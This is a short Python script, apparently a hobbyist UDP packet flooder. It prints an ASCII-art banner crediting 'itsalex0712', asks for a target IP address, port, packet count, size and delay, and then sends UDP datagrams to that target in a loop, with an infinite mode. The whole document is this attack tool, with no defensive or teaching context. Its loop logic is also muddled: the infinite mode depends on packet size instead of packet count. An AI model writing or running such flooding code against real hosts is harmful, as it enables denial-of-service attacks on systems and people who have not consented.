import socket
import time

def print_sign():
    sign = '''
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⡿⠛⠉⠙⢿⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⣾⣿⡟⠀⠀⠀⠀⢹⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣾⣿⠃⠀⠀⠀⠀⠀⢸⣿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣾⣿⡏⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⣿⣿⠃⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣾⣿⡇⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⠀⣰⣿⣿⣶⣶⣶⣶⣶⣶⣶⣶⣿⣿⣿⣿⣦⡀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⡇⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⠀
⠀⠀⠀⠀⠀⢰⣿⡇⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⠀⠀⠀⠀⠀⣾⣿⣧⡀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀
⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣷⣶⣶⣶⣶⣶⣶⣶⣶⣶⣶⣿⠃⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠿⠿⠛⠉⠀⠀⠀
    '''
    print(sign.center(80, ' '))

def print_made_by():
    print("\033[93mMade by itsalex0712\033[0m".center(80, ' '))

# Print the sign in purple color
print("\033[95m")
print_sign()
print("\033[0m")

# Print the made by message in gold color
print_made_by()

print()  # Add an empty line

def send_packets(ip_address, port, num_packets, packet_size, delay):
    try:
        target_address = (ip_address, port)
        data = b'x' * packet_size if packet_size > 0 else b'x'  # Customize the data to be sent (in this case, it's 'x')
        
        if packet_size == 0:
            print("Sending packets infinitely. To stop, press Ctrl+C.")
        
        packet_num = 1
        while packet_size == 0 or packet_num <= num_packets:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                try:
                    s.sendto(data, target_address)
                    print(f"\033[92mPacket {packet_num}/{num_packets} sent successfully.\033[0m")
                    if packet_size == 0:
                        time.sleep(delay)  # Introduce a delay in seconds
                    else:
                        packet_num += 1
                        time.sleep(delay)  # Introduce a delay in seconds
                except Exception as e:
                    print(f"\033[91mPacket {packet_num}/{num_packets} sending failed: {e}\033[0m")
                    if packet_size == 0:
                        time.sleep(delay)  # Introduce a delay in seconds
                    else:
                        packet_num += 1
                        time.sleep(delay)  # Introduce a delay in seconds
    except Exception as e:
        print(f"Error occurred: {e}")

# Get user input for customization
ip_address = input("Enter the target IP address: ")
port = int(input("Enter the target port number: "))
num_packets = int(input("Enter the number of packets to send (0 for infinite): "))
packet_size = int(input("Enter the size of each packet in bytes (0 for infinite): "))
delay = float(input("Enter the delay between each packet (in seconds): "))

send_packets(ip_address, port, num_packets, packet_size, delay)
